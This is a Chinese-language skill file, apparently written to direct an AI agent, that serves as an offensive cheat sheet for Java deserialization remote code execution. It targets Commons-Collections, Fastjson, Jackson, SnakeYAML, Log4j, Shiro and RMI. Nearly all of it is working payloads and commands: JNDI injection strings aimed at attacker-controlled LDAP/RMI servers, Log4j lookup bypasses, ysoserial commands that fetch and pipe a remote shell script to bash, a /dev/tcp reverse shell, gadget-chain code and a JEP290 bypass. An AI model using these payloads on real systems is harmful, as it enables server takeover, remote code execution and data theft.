---
name: java-deserialization
description: Use when encountering java反序列化漏洞利用 - commons-collections、spring、fastjson、log4j等组件的rce攻击链
---

# Java反序列化攻击

## Info

- **Domain**: web
- **Tags**: web, deserialization, java, rce, gadgets

## 核心概念

### Java 序列化基础
```java
// 必须实现 Serializable 接口（标记接口，内容为空）
public class User implements Serializable {
    private static final long serialVersionUID = 1L; // 版本锁
    private String name;
    private transient String password; // transient 字段不会被序列化
}
```

### 漏洞原理（readObject 重写）
```java
public class EvilObject implements Serializable {
    private String cmd;
    // 重写 readObject，反序列化时自动执行
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(cmd);  // RCE
    }
}
```

### URLDNS 探测链（无依赖）
```java
// 原理: HashMap.readObject → hash(key) → URL.hashCode() → DNS解析
URL url = new URL("http://dnslog.example.com");
Field f = URL.class.getDeclaredField("hashCode");
f.setAccessible(true);
f.set(url, -1);  // 关键：重置hashCode缓存
HashMap<Object, Object> map = new HashMap<>();
map.put(url, "value");
```

```bash
# ysoserial 生成
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" > /tmp/urldns.ser
# 注意：必须带 http:// 前缀
```

## 常见漏洞组件

### 1. Apache Commons-Collections

**探测与利用：**
```bash
# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "id" | base64

# CommonsCollections链
- CC1: CommonsCollections <= 3.2.1
- CC2: CommonsCollections4 4.0
- CC3: 利用TemplatesImpl
- CC4: CommonsCollections4 4.0
- CC5: BadAttributeValueExpException
- CC6: HashSet + TiedMapEntry
- CC7: Hashtable
```

**URLDNS探测：**
```bash
# 使用URLDNS检测反序列化点
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" | base64
```

### 2. Fastjson

**JNDI注入：**
```json
// Fastjson <= 1.2.24
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}

// Fastjson 1.2.25-1.2.47 绕过
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}}
```

**TemplatesImpl利用：**
```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64_encoded_bytecode"],"_name":"a","_tfactory":{},"_outputProperties":{}}
```

### 3. Jackson

**Polymorphic Deserialization：**
```json
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}]
```

**CVE-2017-7525：**
```json
{"id":1,"obj":["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://attacker:1099/Exploit","autoCommit":true}]}
```

### 4. SnakeYAML

**ScriptEngine利用：**
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/yaml-payload.jar"]]]]
```

**JNDI注入：**
```yaml
!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "ldap://attacker:1389/Exploit", autoCommit: true}
```

### 5. Log4j (CVE-2021-44228)

**JNDI注入：**
```
${jndi:ldap://attacker:1389/a}
${jndi:rmi://attacker:1099/a}
${jndi:dns://attacker/a}

# 绕过
${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}
${jn${env::-}di:ldap://attacker/a}
```

**信息泄露：**
```
${env:FLAG}
${java:os}
${sys:user.home}
```

## 工具

### ysoserial
```bash
# 生成payload
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker/shell.sh|bash" | base64 -w 0

# JRMP服务端
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "id"
```

### marshalsec (JNDI服务器)
```bash
# 启动LDAP服务器
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8080/#Exploit" 1389

# 启动RMI服务器
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker:8080/#Exploit" 1099
```

### JNDIExploit
```bash
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker_ip
```

### fastjson-exploit
```bash
python3 fastjson_exp.py -u http://target -t fastjson
```

## 攻击链

### 1. 检测反序列化点
```bash
# 发送URLDNS payload
java -jar ysoserial.jar URLDNS "http://dnslog.cn" | base64

# 监听DNS回调确认
```

### 2. 确定Gadget
```bash
# 尝试不同CC链
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6; do
  java -jar ysoserial.jar $chain "id" > payload.bin
  # 发送payload
done
```

### 3. 获取Shell
```bash
# 反弹shell
java -jar ysoserial.jar CommonsCollections6 "bash -c {curl,http://attacker/shell.sh}|{bash,-i}" | base64

# 或使用JNDI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8080/#Shell" 1389
```

## JNDI 注入

### JNDI + RMI（JDK ≤ 8u121）
```java
// RMI 服务端绑定 Reference
Reference ref = new Reference("EvilClass", "EvilClass", "http://attacker:8002/");
ReferenceWrapper wrapper = new ReferenceWrapper(ref);
Registry registry = LocateRegistry.createRegistry(1099);
registry.rebind("EvilClass", wrapper);

// EvilClass 实现 ObjectFactory，static{} 块执行命令
public class EvilClass implements ObjectFactory {
    static { Runtime.getRuntime().exec("calc"); }
    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?,?> env) { return null; }
}
```

### JNDI + LDAP（JDK ≤ 8u191）
```
受害者 → ctx.lookup("ldap://attacker:1389/Exploit")
       → LDAP 返回 Reference（含 javaCodeBase, javaFactory）
       → 受害者从 attacker HTTP 下载 Evil.class
       → 实例化 → static{} 执行命令
```

**marshalsec 快速启动**:
```bash
# RMI RefServer
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker:8000/#Exploit" 9999
# LDAP RefServer
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit" 1389
```

### LDAP 高版本绕过（JDK ≥ 8u191）
高版本禁止远程加载类（`trustURLCodebase=false`），改为 **直接存储序列化数据**：

```java
// LDAP 返回属性中直接包含 CC6 链的序列化数据
e.addAttribute("javaClassName", "Exploit");
e.addAttribute("javaSerializedData", Base64.getDecoder().decode(base64Data));
// 不需要受害者远程加载类，只需要本地有对应依赖即可
```

### CTF 利用链
```
Fastjson/Jackson/Log4j → @type JNDI注入 → ldap://attacker:1389/Exploit
→ marshalsec LDAPRefServer 返回 Reference
→ 受害者下载 class 执行命令

高版本: → LDAP 返回 javaSerializedData (CC6链)
→ 受害者本地反序列化执行（不需要远程加载）
```

---

## 反射利用

### 反射执行命令（无 import 环境）
```java
Class.forName("java.lang.Runtime")
    .getMethod("exec", String.class)
    .invoke(
        Class.forName("java.lang.Runtime")
            .getMethod("getRuntime")
            .invoke(null),
        "calc"
    );
```

### 反射修改 final 字段
```java
Field modifiersField = Field.class.getDeclaredField("modifiers");
modifiersField.setAccessible(true);
modifiersField.setInt(targetField, targetField.getModifiers() & ~Modifier.FINAL);
targetField.set(instance, newValue);
```

### ClassLoader defineClass 绕过
```java
// 从字节码加载恶意类（内存马核心）
byte[] bytecode = ...; // 恶意 class 字节码
Method defineClass = ClassLoader.class.getDeclaredMethod(
    "defineClass", String.class, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
Class evilClass = (Class) defineClass.invoke(
    Thread.currentThread().getContextClassLoader(),
    "EvilClass", bytecode, 0, bytecode.length);
evilClass.newInstance();
```

## 常见CVE

| CVE | 组件 | 描述 |
|-----|------|------|
| CVE-2015-4852 | WebLogic | Commons-Collections反序列化 |
| CVE-2017-12149 | JBoss | 反序列化RCE |
| CVE-2019-0193 | Apache Solr | JMX RCE |
| CVE-2020-0688 | Exchange | ValidationService反序列化 |
| CVE-2021-26084 | Confluence | OGNL注入 |
| CVE-2021-44228 | Log4j | JNDI注入 |

## CommonsCollections1 详细链

```
AnnotationInvocationHandler.readObject()
  → memberValue.setValue()
    → checkSetValue(valueTransformer.transform())
      → InvokerTransformer.transform()
        → ChainedTransformer.transform()
          → ConstantTransformer(Runtime.class)
          → InvokerTransformer.getMethod("getRuntime")
          → InvokerTransformer.invoke()
          → InvokerTransformer.getMethod("exec")
          → InvokerTransformer.invoke("cmd")
            → Runtime.getRuntime().exec("cmd")
```

## Fastjson 1.2.83 通杀链（TemplatesImpl）

```java
// 通过 Javassist 动态生成恶意类
ClassPool pool = ClassPool.getDefault();
CtClass clazz = pool.makeClass("a");
clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
CtConstructor c = new CtConstructor(new CtClass[]{}, clazz);
c.setBody("Runtime.getRuntime().exec(\"cmd\");");
clazz.addConstructor(c);
byte[] bytecode = clazz.toBytecode();

// 构造 TemplatesImpl
TemplatesImpl t = TemplatesImpl.class.newInstance();
setValue(t, "_bytecodes", new byte[][]{bytecode});
setValue(t, "_name", "111");
setValue(t, "_tfactory", null);

// 通过 BadAttributeValueExpException 触发
BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
setValue(bd, "val", new JSONArray(){{add(t);}});

// HashMap 序列化后发送
HashMap hashMap = new HashMap();
hashMap.put(t, bd);
// → 序列化 → 发送 → 反序列化触发
```

## JRMP 协议攻击

```bash
# 攻击服务端（已知 RMI 端口）
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 目标IP 1099 CommonsCollections1 "calc"
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 目标IP 1099 CommonsCollections1 "calc"

# 攻击客户端（让客户端连接恶意注册中心）
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 "calc"
# 客户端连接此端口即触发
```

## RMI 反序列化攻击面

| 攻击方向 | 方法 | 条件 |
|----------|------|------|
| 客户端→注册中心 | bind/rebind 传入恶意对象 | 注册中心有反序列化链 |
| 客户端→服务端 | 方法参数为 Object 类型 | 服务端classpath有gadget |
| 注册中心→客户端 | lookup 返回恶意对象 | 客户端classpath有gadget |
| 服务端→客户端 | 返回值恶意序列化 | 客户端classpath有gadget |

**JEP290 Bypass**（JDK ≤ 8u231）：
```java
// 构造白名单内的 UnicastRef 对象
ObjID id = new ObjID(new Random().nextInt());
TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
// DGC机制会二次连接到恶意JRMP服务，触发攻击链
```

## Shiro 反序列化

### Shiro-550（CVE-2016-4437）
- 影响：Apache Shiro ≤ 1.2.4
- 原理：rememberMe Cookie 使用硬编码 AES 密钥加密
- 利用：爆破密钥 → 伪造恶意序列化 Cookie → 反序列化 RCE
- 流程：序列化 → AES加密 → Base64编码 → rememberMe Cookie

### Shiro-721（CVE-2019-12422）
- 影响：Apache Shiro < 1.4.2
- 原理：AES-128-CBC Padding Oracle 攻击
- 利用：通过服务器返回的错误信息逐步猜测 AES 密钥

### 命令编码（Shiro 场景）
```bash
# 原始命令
sh -i >& /dev/tcp/IP/PORT 0>&1
# Base64编码后
bash -c {echo,c2g...}|{base64,-d}|{bash,-i}
# 使用 Allecho 链回显，选择可用的 ysoserial 链
```

| CVE | 组件 | 描述 |
|-----|------|------|
| CVE-2016-4437 | Shiro ≤1.2.4 | rememberMe 硬编码密钥反序列化 |
| CVE-2019-12422 | Shiro <1.4.2 | Padding Oracle 攻击获取密钥 |